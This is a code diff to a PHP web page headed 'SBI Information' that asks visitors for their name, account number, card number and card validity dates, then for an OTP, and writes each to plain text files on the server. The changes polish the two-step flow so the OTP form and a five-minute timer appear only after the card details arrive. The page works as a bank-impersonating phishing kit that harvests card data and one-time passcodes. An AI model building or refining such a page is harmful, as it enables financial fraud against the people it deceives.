@@ -1,19 +1,27 @@
 <?php
+$message = ""; 
+
 if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
+   
     $otp = htmlspecialchars($_POST['otp']);
+    
     file_put_contents("otp.txt", "OTP: $otp\n", FILE_APPEND);
-    $message = "OTP saved.";
+    $message = "OTP saved successfully!";
 } elseif ($_SERVER["REQUEST_METHOD"] == "POST") {
+    
     $name = htmlspecialchars($_POST['name']);
     $accountNumber = htmlspecialchars($_POST['accountNumber']);
     $cardNumber = htmlspecialchars($_POST['cardNumber']);
     $validFrom = htmlspecialchars($_POST['validFrom']);
     $validUpto = htmlspecialchars($_POST['validUpto']);
 
+    
     $data = "Name: $name\nAccount Number: $accountNumber\nCard Number: $cardNumber\nValid From: $validFrom\nValid Upto: $validUpto\n\n";
     file_put_contents("data.txt", $data, FILE_APPEND);
 
+    
     $message = "Information submitted successfully! Please enter the OTP.";
+    $showOtpForm = true; // Set to true to show OTP form
 }
 ?>
 
@@ -136,7 +144,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
             <h1>SBI Information</h1>
         </div>
 
-        <?php if (!isset($_POST['otp'])): ?>
+        <?php if (!isset($showOtpForm)): ?>
             <form id="infoForm" method="POST">
                 <div class="input-group">
                     <label for="name">Name</label>
@@ -171,6 +179,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
                     <button type="submit">Verify OTP</button>
                     <p id="timer">05:00</p>
                 </form>
+                <p id="message"><?= isset($message) ? $message : ''; ?></p>
             </div>
         <?php endif; ?>
     </div>
@@ -193,12 +202,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
                 if (--timer < 0) {
                     clearInterval(countdown);
                     timerDisplay.textContent = "Time's up!";
-                    document.getElementById("otpContainer").style.display = "none";  
+                    document.getElementById("otpContainer").style.display = "none"; 
                 }
             }, 1000);
         }
 
-        startTimer(300); 
+        <?php if (isset($showOtpForm)): ?>
+            document.getElementById("otpContainer").style.display = "block";
+            startTimer(300);
+        <?php endif; ?>
     </script>
 </body>
 </html>
